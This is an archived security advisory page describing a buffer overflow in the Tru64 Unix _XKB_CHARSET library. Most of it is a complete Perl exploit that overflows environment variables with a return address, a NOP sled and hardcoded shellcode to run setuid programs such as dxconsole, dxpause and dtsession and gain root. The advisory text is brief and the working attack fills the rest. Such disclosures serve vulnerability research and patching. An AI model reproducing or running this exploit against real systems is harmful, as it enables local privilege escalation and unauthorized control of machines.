source: http://www.securityfocus.com/bid/5648/info

Tru64 is a commercially available Unix operating system originally developed by Digital. It is distributed and maintained by HP.

A buffer overflow has been discovered in the _XKB_CHARSET library. A number of programs depend on the library, including dxconsole, dxpause and dtsession. Because of this flaw, it may be possible for a local user to execute arbitrary instructions. This could lead to the execution of attacker-supplied code, and elevated privileges. 

#!/usr/bin/perl -w
#
# Tru64 5.1 _XKB_CHARSET
#
# stripey (stripey@snosoft.com) - 10/07/2002
#                                 

$tgts{"0"} = pack("l",0x40010250).":/usr/bin/X11/dxconsole:uid=root";
$tgts{"1"} = pack("l",0x40012584).":/usr/bin/X11/dxpause:uid=root";
$tgts{"2"} = pack("l",0x400101e4).":/usr/dt/bin/dtsession:euid=root";
                                  
unless (($target,$offset,$align) = @ARGV,$align) {           
                                  
        print "-"x72;
        print "\n      Tru64 _XKB_CHARSET overflow, stripey\@snosoft.com, 03/07/2002\n";
        print "-"x72;
        print "\n\nUsage: $0 <target> <offset> <align>\n\nTargets:\n\n";
                                  
        foreach $key (sort(keys %tgts)) {
                ($a,$b,$c) = split(/\:/,$tgts{"$key"});
                print "\t$key. $b ( $c )\n";
        }
       
        print "\n";
        exit 1;
}             

($a,$b) = split(/\:/,$tgts{"$target"});
                                  
print "*** Target: $b, Offset: $offset, Align: $align ***\n\n";
                                  
$ret = pack("ll",(unpack("l",$a)+$offset), 0x1);              
                                  
$sc .= "\x30\x15\xd9\x43\x11\x74\xf0\x47\x12\x14\x02\x42";
$sc .= "\xfc\xff\x32\xb2\x12\x94\x09\x42\xfc\xff\x32\xb2";
$sc .= "\xff\x47\x3f\x26\x1f\x04\x31\x22\xfc\xff\x30\xb2";
$sc .= "\xf7\xff\x1f\xd2\x10\x04\xff\x47\x11\x14\xe3\x43";
$sc .= "\x20\x35\x20\x42\xff\xff\xff\xff\x30\x15\xd9\x43";
$sc .= "\x31\x15\xd8\x43\x12\x04\xff\x47\x40\xff\x1e\xb6";
$sc .= "\x48\xff\xfe\xb7\x98\xff\x7f\x26\xd0\x8c\x73\x22";
$sc .= "\x13\x05\xf3\x47\x3c\xff\x7e\xb2\x69\x6e\x7f\x26";
$sc .= "\x2f\x62\x73\x22\x38\xff\x7e\xb2\x13\x94\xe7\x43";
$sc .= "\x20\x35\x60\x42\xff\xff\xff\xff";               
                                  
$buf_a  = "A"x256;
$buf_a .= $ret;

$buf_b  = "B"x$align;
if ($target eq "2" ) {     
        $buf_b .= pack("l",0x47ff041f)x56;
} else {
        $buf_b .= pack("l",0x47ff041f)x3750;
}
$buf_b .= $sc;                        
    
$ENV{"_XKB_CHARSET"} = $buf_a;
$ENV{"HOME"} = $buf_b;       
                    
exec("$b");          